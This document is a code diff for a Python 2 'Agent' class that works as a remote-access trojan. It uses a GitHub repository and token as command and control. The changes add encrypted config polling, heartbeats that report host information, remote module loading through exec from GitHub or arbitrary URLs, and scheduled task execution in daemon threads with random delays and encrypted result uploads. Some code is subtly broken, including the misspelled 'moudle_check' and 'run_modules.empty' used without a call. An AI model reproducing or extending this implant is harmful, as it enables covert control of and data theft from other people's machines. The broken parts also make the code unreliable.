@@ -9,6 +9,7 @@ import string
 import time
 import threading
 import logging
+import Queue
 
 try:
     from urllib2 import urlopen, Request
@@ -132,13 +133,14 @@ def Threaded(func):
 class Agent(object):
     # python -c "import os;print(os.urandom(8).hex())"
     uid = '602841a3ee0ecb12'
+    gid = 'aecdf0678459dcd8'
 
     def __init__(self, owner, repo, branch='master',
                  conf_path='config', debug=False):
         self.owner = owner
         self.repo = repo
         self.branch = branch
-        self.conf_path = '/'.join((conf_path, self.uid + '.conf'))
+        self.conf_path = conf_path
         self.debug = debug
         # self.idle = True
         self.silent = False
@@ -152,9 +154,12 @@ class Agent(object):
         self.aes_key = ''
         self.tasks = set()
         self.modules = {}
-        self.run_modules = []
+        self.run_modules = Queue.Queue()
+        self.task_queue = Queue.Queue()
+        self.modules_ok = []
         self.info = self.get_info()
         self.init()
+        self.run_task()
 
     def init(self):
         self.conf_sha = None
@@ -167,31 +172,44 @@ class Agent(object):
         self.heartbeat()
 
     def parse_conf(self):
-        self.gh_conf = self.conf['BaseAcc'].split('$$')
-        self.gh_result = self.conf['RetAcc'].split('$$')
-        self.report_path = self.conf['RetPath']
-        self.hbt = self.conf['HBTime']
-        self.conf_path = '/'.join((self.conf['ConfPath'], self.uid + '.conf'))
-        self.aes_key = self.conf['AesKey']
-        self.cmdpub = self.conf['SrvPubKey']
-        self.prikey = self.conf['ToyPriKey']
-        self.modules = self.conf['Modules']
+        try:
+            self.gh_conf = self.conf['BaseAcc'].split('$$')
+            self.gh_result = self.conf['RetAcc'].split('$$')
+            self.ret_path = self.conf['RetPath']
+            self.hbt = self.conf['HBTime']
+            self.conf_path = self.conf['ConfPath']
+            self.aes_key = self.conf['AesKey']
+            self.cmdpub = self.conf['SrvPubKey']
+            self.prikey = self.conf['ToyPriKey']
+            self.modules = self.conf['Modules']
 
-        self.owner = self.gh_conf[0]
-        self.token = self.gh_conf[1]
-        self.repo = self.gh_conf[2]
+            self.owner = self.gh_conf[0]
+            self.token = self.gh_conf[1]
+            self.repo = self.gh_conf[2]
 
-        self.conf = None
-        # self.tasks.extend(self.conf['Tasks'])
-        # for task in self.conf['Tasks']:
-        #     self.tasks.add(task)
+            for task in self.conf['Tasks']:
+                self.tasks.add(task)
+
+            self.conf = None
+        except Exception as e:
+            if self.debug:
+                print(e)
+
+    @property
+    def base_url(self):
+        _base_url = 'https://raw.githubusercontent.com/'
+        _base_url += '/'.join((self.owner, self.repo, self.branch, ''))
+        return _base_url
 
     @property
     def conf_url(self):
-        conf_url = 'https://raw.githubusercontent.com/'
-        conf_url += '/'.join((self.owner, self.repo, self.branch,
-                              self.conf_path))
-        return conf_url
+        conf_path = '/'.join((self.conf_path, self.gid, self.uid + '.conf'))
+        return self.base_url + conf_path
+
+    @property
+    def report_base(self):
+        _report_base = '/'.join((self.ret_path, self.gid, self.uid, ''))
+        return _report_base
 
     # def task_conf_url(self, taskid):
     #     path = self.conf['ConfPath'] + 'task/'
@@ -203,16 +221,21 @@ class Agent(object):
 
     @Threaded
     def heartbeat(self):
-        path = '/'.join((self.conf['RetPath'], 'knock', self.uid + '.hbt'))
+        path = self.report_base + 'knock.hbt'
         while True:
-            # info = self.get_info()
-            self.info['timestamp'] = time.time()
-            # self.report(str(time.time()), path, plain=True)
-            self.report(json.dumps(self.info), path, plain=True)
-            time.sleep(self.hbt)
-            if self.is_conf_update(self.conf_path, self.conf_sha):
-                # self.init(self.conf_url)
-                self.parse_conf()
+            try:
+                # info = self.get_info()
+                self.info['timestamp'] = time.time()
+                # self.report(str(time.time()), path, plain=True)
+                self.report(json.dumps(self.info), path, plain=True)
+                time.sleep(self.hbt)
+                if self.is_conf_update(self.conf_path, self.conf_sha):
+                    # self.init(self.conf_url)
+                    self.parse_conf()
+                    self.moudle_check()
+            except Exception as e:
+                if self.debug:
+                    print(e)
 
     def get_info(self):
         ip = self.get_host_ip()
@@ -259,13 +282,13 @@ class Agent(object):
             c = self.gh.get(self.conf_path)
             if c['sha'] == self.conf_sha:
                 return False
+            self.conf_sha = c['sha']
+            self.conf = self.decrypt(c['content'].decode('base64'))
+            return True
         except Exception as e:
             if self.debug:
                 print(e)
             return False
-        self.conf_sha = c['sha']
-        self.conf = self.decrypt(c['content'].decode('base64'))
-        return True
 
     def get_content(self, url):
         try:
@@ -274,11 +297,11 @@ class Agent(object):
                 conf = self.decrypt(conf.strip())
                 return json.loads(conf)
             else:
-                return {}
+                return None
         except Exception as e:
             if self.debug:
                 print(e)
-            return {}
+            return None
 
     def report(self, msg, path, plain=False):
         content = msg if plain else self.encrypt(msg)
@@ -290,9 +313,36 @@ class Agent(object):
         if self.debug:
             print(s)
 
-    @Threaded
-    def task_run(self, max=5):
-        pass
+    def moudle_check(self):
+        for task in self.tasks:
+            requires = task.get('requires', None)
+            if requires:
+                for r in requires:
+                    pkg = r.get('package', '')
+                    mod = r.get('module', None)
+                    self.load(r['name'], r['url'], pkg, mod)
+            self.loadGH(task['mod'])
+            self.task_run_check(task)
+
+        for mod in self.modules:
+            self.loadGH(mod)
+            self.run_modules.put(dict(name=mod.__name__, mod=mod))
+
+    # @Threaded
+    def task_run_check(self, task):
+        now = time.time()
+        if task['start'] > task['end']:
+            self.tasks.remove(task)
+        if now >= task['start'] and now <= task['end']:
+            task['build'] = now
+            # task['nextrun'] = 0
+            if task['step'] > 0:
+                task['start'] += task['step']
+            # task['nextrun'] = nextrun
+            self.run_modules.put(task.copy())
+            return task
+        # elif now < task['start']:
+        #     return task
 
     def random_key(self, num=16):
         return ''.join(random.sample(string.printable, num))
@@ -373,12 +423,14 @@ class Agent(object):
         else:
             pk = '.'.join((repo, package)) if package.split(
                 '.')[0] != repo else package
-            md = ','.join(module) if isinstance(
+            md = ', '.join(module) if isinstance(
                 module, (list, tuple)) else module
+
+            pk = pk[:-1] if pk.endswith('.') else pk
             with remote_repo([repo], url):
                 exec "from %s import %s" % (pk, md)
 
-    def loadGH(self, module, package='', user=None, repo=None):
+    def loadGH(self, module, package='moudle', user=None, repo=None):
         user = user or self.owner
         repo = repo or self.repo
         pk = '.'.join((repo, package)) if package.split(
@@ -386,31 +438,32 @@ class Agent(object):
         md = ','.join(module) if isinstance(
             module, (list, tuple)) else module
 
+        pk = pk[:-1] if pk.endswith('.') else pk
         with github_repo(user, repo):
             exec "from %s import %s" % (pk, md)
 
-    @staticmethod
-    def unload(module, url):
+    def unload(self, module, url=None):
         logging.info('Try to unload module')
+        url = url or self.base_url
         remove_remote_repo(url)
         if module in sys.modules:
             del module
 
-    def install(self):
-        for url, pkgs in self.base_modules.items():
-            if not isinstance(pkgs, (list, tuple)):
-                pkgs = [pkgs]
-            for p in pkgs:
-                self.load(p, url)
-        for pkg in self.run_modules:
-            self.load_module(pkg['module'])
-        self.init = False
+    # def install(self):
+    #     for url, pkgs in self.base_modules.items():
+    #         if not isinstance(pkgs, (list, tuple)):
+    #             pkgs = [pkgs]
+    #         for p in pkgs:
+    #             self.load(p, url)
+    #     for pkg in self.run_modules:
+    #         self.load_module(pkg['module'])
+    #     self.init = False
 
-    def parse_require(self, pkg):
-        requires = pkg.get('requires', None)
-        if requires:
-            for k, v in requires.items():
-                self.load(v, k)
+    # def parse_require(self, pkg):
+    #     requires = pkg.get('requires', None)
+    #     if requires:
+    #         for k, v in requires.items():
+    #             self.load(v, k)
 
     # def check(self, url=None):
     #     url = url or self.conf_url
@@ -447,37 +500,47 @@ class Agent(object):
     #         tasks = []
     #     return tasks
 
-    def worker(self, m, loop=False):
-        path = self.result_path + '%d.data' % random.randint(
-            1000, 100000)
+    def worker(self, m, args=None, kwargs=None):
+        args = args or []
+        kwargs = kwargs or {}
+        task_name = kwargs.pop('task_name') or m.__name__
+        build = int(kwargs.pop('build'))
+        start = int(kwargs.pop('start'))
+        path = self.report_base + '%s.data' % '_'.join(
+            (task_name, str(build), str(start)))
         self.task_queue.put(1)
-        print sys.modules[m]
-        result = sys.modules[m].run() or 'Err'
+        if self.debug:
+            print(sys.modules[m])
+
+        result = sys.modules[m].run(*args, **kwargs) or 'Err'
         self.task_queue.get()
         if result:
             print('[*] Get result: %s' % result)
             # time.sleep(5)
             self.report(result, path)
-        if not loop:
-            del sys.modules[m]
         return
 
-    def run(self):
-        self.install()
+    @Threaded
+    def run_task(self):
+        # self.install()
         while True:
-            if self.task_queue.empty():
-                if not self.init:
-                    self.check()
-                for task in self.run_modules:
-                    logging.info("run task %s" % task['module'])
-                    mod = 'toy.modules.%s' % task['module']
-                    try:
-                        t = threading.Thread(
-                            target=self.worker, args=(mod,))
-                        t.start()
-                        time.sleep(random.randint(1, 10))
-                    except Exception:
-                        logging.error('run exception')
-                        pass
-            time.sleep(self.cf)
-            # time.sleep(random.randint(1000, 10000))
+            if not self.run_modules.empty:
+                task = self.run_modules.get()
+                logging.info("run task %s" % task['mod'])
+                mod = 'toy.module.%s' % task['mod']
+                arg = task.get('args', ())
+                kws = task.get('kws', {})
+                kws['task_name'] = task.get('name')
+                kws['build'] = task.get('build')
+                kws['start'] = time.time()
+                try:
+                    t = threading.Thread(
+                        target=self.worker, args=(mod, arg, kws))
+                    t.daemon = True
+                    t.start()
+                    time.sleep(random.randint(1, 10))
+                except Exception:
+                    logging.error('run exception')
+                    pass
+            # time.sleep(self.cf)
+            time.sleep(random.randint(10, 50))
